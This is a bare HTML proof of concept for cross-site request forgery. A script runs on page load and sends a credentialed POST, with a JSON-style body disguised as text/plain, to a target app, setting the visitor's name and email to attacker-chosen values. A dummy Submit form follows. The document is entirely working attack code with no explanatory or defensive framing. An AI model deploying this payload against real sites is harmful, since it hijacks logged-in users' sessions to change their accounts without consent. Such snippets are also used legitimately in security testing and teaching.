
 <script>
fetch('http://vul-app.com', {method: 'POST', credentials: 'include', headers: {'Content-Type': 'text/plain'}, body: '{"name":"attacker","email":"attacker.com"}'});
</script>
<form action="#">
<input type="button" value="Submit" />
</form>
